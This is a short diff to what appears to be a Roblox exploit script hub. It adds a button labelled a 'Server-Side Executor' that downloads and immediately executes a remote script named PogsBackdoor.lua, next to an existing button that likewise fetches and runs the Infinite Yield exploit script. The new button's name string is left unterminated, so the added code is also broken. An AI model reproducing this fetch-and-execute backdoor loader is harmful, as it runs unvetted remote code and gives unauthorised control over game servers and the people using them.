@@ -29,6 +29,13 @@ local Tabs = {
 }
 
 Tabs.Scripts:CreateButton({
+    Name = "starlight Server-Side Executor,
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/TempUserIdk18/robloxscripts/refs/heads/main/PogsBackdoor.lua"))()
+    end
+})
+
+Tabs.Scripts:CreateButton({
     Name = "Infinite Yield",
     Callback = function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
